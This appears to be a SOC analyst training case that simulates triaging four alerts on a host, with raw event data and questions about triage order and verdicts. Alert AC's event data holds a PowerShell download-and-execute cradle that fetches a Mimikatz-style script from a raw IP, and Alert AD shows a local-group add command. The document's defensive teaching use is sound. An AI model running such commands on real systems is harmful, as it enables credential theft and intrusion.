# Case 017 — Phase 3: Full Queue Simulation

**Incident ID:** IR-2026-033
**Date Detected:** 2026-07-06
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk Alert)
**Status:** 🔴 Open — Pending Triage

**Phase:** 3 — Full queue simulation.

---

## 🎫 Initial Queue — 4 Alerts

| # | Alert | Type | SIEM Severity |
|---|---|---|---|
| 1 | Alert AC | PowerShell downloading and executing Mimikatz-style tool | 🔴 High |
| 2 | Alert AD | User added self to "Remote Desktop Users" group | 🟠 Medium |
| 3 | Alert AE | Suspicious outbound SMTP connection (non-standard port) | 🟠 Medium |
| 4 | Alert AF | System time changed backward by 2 hours | 🟡 Low |

**Analyst's chosen order:** AC → AE → AD → AF

---

## 📄 Raw Event Data

### Alert AC
```
Process_Command_Line: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://176.113.115.7/mimi.ps1')"
Account: hp | Parent: cmd.exe
```

### Alert AE
```
Outbound connection: JIMIL-JOSHI -> 45.32.99.100:2525 (non-standard SMTP port)
Account: hp | Process: powershell.exe
```

### Alert AD
```
Process_Command_Line: net localgroup "Remote Desktop Users" hp /add
Account: hp | Parent: cmd.exe
```

### Alert AF
```
System time changed from 14:30 to 12:30 (2 hours backward)
Account: hp | Event: System clock change
```

---

## 🎯 Task

1. Determine triage order across all 4 alerts and justify it.
2. Investigate each alert independently.
3. Give a verdict (TP/FP/Ambiguous) for each with justification.
4. For Alert AD: does a user adding *themselves* to a group differ from adding a separate, unfamiliar account (compare Case_002)?
5. For Alert AF: does correlation with other alerts in the same session change how this should be triaged in isolation?
